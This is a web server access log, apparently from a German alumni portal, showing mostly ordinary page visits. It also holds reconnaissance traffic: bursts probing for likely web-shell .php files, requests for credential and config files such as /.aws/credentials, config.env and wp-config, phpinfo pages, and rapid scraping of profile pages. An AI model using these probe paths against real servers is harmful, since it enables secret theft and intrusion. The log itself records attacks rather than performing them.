93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:41;;/oddtd.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:41;;/v.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:42;;/ff.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:42;;/ca.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:42;;/inzrw.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:42;;/0x.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:43;;/sx.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:43;;/we.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:43;;/20025.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:44;;/asd67.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:44;;/axx.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:44;;/rtg.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:45;;/wp.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:45;;/wp-good.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:45;;/ngek.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:46;;/wp-admin/network/wp-conflg.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:46;;/3k4.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:46;;/file51.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:47;;/man.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:47;;/unrubbish.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:48;;/strubbly.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:48;;/tiqdc.php;GET;404
93ff6c760be068bcab942e34304b01ee872326f762e9c72a5bdac14728f9f702;2025-11-06 02:13:48;;/hdwta.php;GET;404
d9bec6cab084b4235de8f09e4410dc7115977a3d4e0984541856f745ea76591e;2025-11-06 02:31:36;;/;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-06 02:38:07;/personen/alumni/schule/68470;/aktuelles/meldungen;GET;200
fda2e36a0cbddb6e3f2235d18ea8000185358b8bb873d82f52eea0255908784b;2025-11-06 02:49:58;;/;GET;200
60ea422e2ffb9dd80e130be7b788efa4eece5023b25fdda9e6d5f41074b194c9;2025-11-06 03:23:04;;/;GET;200
7a1dd6bf7f68efa7bdf85d9a71a7398d3168d5d7b14cf023ccedc46d49fa287b;2025-11-06 03:27:18;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-06 03:27:19;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
e5f108e496fc21f38688c1e1d65f683962e635f7badff987b0dc7c87c6f77194;2025-11-06 03:27:21;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-06 03:45:04;/personen/alumni/details/dilek-keskin;/gruppen/hobby/wandern;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-06 03:46:34;/personen/alumni/details/dilek-keskin;/gruppen/hobby/sozialwissenschaften;GET;200
9fb41a111a7583422e066521d5bf29ad592b12a22e9f2e3d37db940781a75ffe;2025-11-06 03:47:58;/personen/alumni/schule/68470;/personen/alumni/schule/10A04;GET;200
6d1f4669a2a8d5553f4267996d2c6d6742763938e0ccbbcbe9ddbf8967b5f1ba;2025-11-06 03:53:11;;/modules/mod_ppc_simple_spotlight/elements/upload_file.php;GET;404
d40f6e7a4c3fbac7e9fa3ddbdf195b154c34123926d25ba3df8bc7440d4322c5;2025-11-06 03:55:59;/;/;GET;200
242d0e9c32a13c08b150da7dbb44be25c356892ea858b72d633d3daa723c1104;2025-11-06 04:12:01;/gruppen/hobby/fotografie;/gruppen/hobby/fotografie;GET;200
310a96b41241a606d5b04ac7e8fe207c42da265feffe9e79768823500c7547a0;2025-11-06 04:17:07;;/;GET;200
dd5c73df0516212b9edc92bb3ea7343cfde2174c8b1a0af492062c2637bc255b;2025-11-06 04:18:47;;/about/allgemein;GET;200
56c00389a9884a04b2c3c1fd6eafd9d14a3de8ce0f683c4452f0f2eb47aa9dd2;2025-11-06 04:32:28;/personen/alumni/details/thomas-matzig;/gruppen/hobby/chor;GET;200
57ce1755969561156eb57b5f93feccc885eb82593dda4784e0db8211e7cf4a60;2025-11-06 04:43:37;;/;GET;200
a157b969de6223951933c29d5f135a38a53b70aec41e6cc5ec73f1acaefc493d;2025-11-06 04:45:54;;/;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-06 04:56:25;/;/;GET;200
6d0598ab4f6a8495d0ff17ea18f9765b9acb366630d461812d485faffa773591;2025-11-06 05:04:59;;/;GET;200
d0055d630e32011e990d682a5d771d7ce0d78014f9dea40738ece3b65fea17bf;2025-11-06 05:14:22;;/;GET;200
d5a4ac349e0bc223481ab440a822fa0fcc45e28f753e4a8706dae740c136d405;2025-11-06 05:14:32;/gruppen/plausch/ai-driven-programme;/gruppen/plausch/ai-driven-programme;GET;200
8419fa30881a42a9ecb60ffb65ab27f07b466624b7f5c776b0580edcc48927ba;2025-11-06 05:41:25;;/;GET;200
d07034c48ce78ddcc7d77bac2d073ea444f79de846120d0e77a7c4350a6039e1;2025-11-06 05:45:42;;/;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:43;;/;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:44;;/;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:57;;/assets/app/form.js;GET;404
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:57;;/assets/bootstrap.js;GET;404
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:57;;/assets/app/core.js;GET;404
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/59026;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/assets/app/form.js;GET;404
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5504;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/170690;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/170720;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/59013;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/MP002;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/170574;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5501;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/185826;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5826;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/59000;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/164094;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/SL001;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/67933;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/600027;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/04A06;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/4240016;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/164045;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/BW001;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/aktuelles/stellenangebote;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5514;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5507;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/65936;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/10A04;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/66345;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/09A05;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/183052;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5820;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/68470;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/about/allgemein;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/aktuelles/meldungen;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/07A05;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/0349;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5508;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/67945;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/190627;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5511;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/gruppen;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/themen;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/9002;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/suchergebnisse;GET;302
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/67210;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/rechtliches/datenschutz;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/0351;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5505;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/620014;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5503;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/9009;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/9001;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/191073;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/veranstaltungen;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/HB0002;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/HB0001;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/68457;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/rechtliches/green-data;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/04A04;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/59043;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/5506;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/MP003;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:45:59;;/personen/alumni/schule/0348;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/610021;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/65262;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/profile;GET;302
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/03A04;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/0350;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/9004;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/01A04;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/MP004;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/5502;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/190962;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/65286;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/188001;GET;200
a82624a4448894c9caceb4a40d0d3a95d08b4c9fc7a0fcaaf61c7e15dbccec58;2025-11-06 05:46:00;;/personen/alumni/schule/MP001;GET;200
c7b31be2a1374d5ab657723015e630b4be5d432a9caedcf617bf337cb2add941;2025-11-06 05:50:24;;/;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:43;;/;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:44;;/;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/themen/details/abschied-aus-moabit;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/themen/details/der-start-ins-studium;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/aktuelles/stellenangebote;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:52:46;;/personen;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:53:26;;/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:53:26;;/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:17;;/_profiler/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:17;;/_profiler/phpinfo/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:17;;/_profiler/phpinfo/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:17;;/wp-config;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:17;;/aws-secret.yaml;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:17;;/env.backup;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:18;;/xampp/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:18;;/lara/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:18;;/lara/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:54:18;;/laravel/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:18;;/api/shared/config/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:18;;/api/shared/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:18;;/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:19;;/api/config.env;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:19;;/service/email_service.py;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:19;;/server/config/database.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:19;;/scripts/nodemailer.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/.aws/credentials;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/dashboard/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/static/js/main.141b0494.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/static/js/2.ca066a4b.chunk.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/static/js/main.e85f7a37.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/admin/server_info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/server_info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:20;;/app_dev.php/_profiler/phpinfo;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/test.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/server-info;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/server-info.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/secured/phpinfo.php;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/server.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/appsettings.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/shared/config/config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/config/aws.yml;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/settings.py;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/config.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/main.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/config/constants.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/application.properties;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/public/js/main.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/js/main.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:21;;/?phpinfo=1;GET;200
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/storage/logs/laravel.log;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/karma.conf.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/swagger.json;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/swagger.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/gatsby-config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/backend/config/default.yml;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/app.py;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/admin/controllers/merchant.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/admin/controllers/partner.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/api/config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:22;;/api/objects/codes.php.save;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:23;;/apis/config/config.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:23;;/apis/controllers/users.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:23;;/app.js;GET;404
a891ae99e964d030c53dedb93c3c2cabb01bd95ec9949c3af4266a34812a7ab0;2025-11-06 05:55:23;;/backend/config/development.yml;GET;404
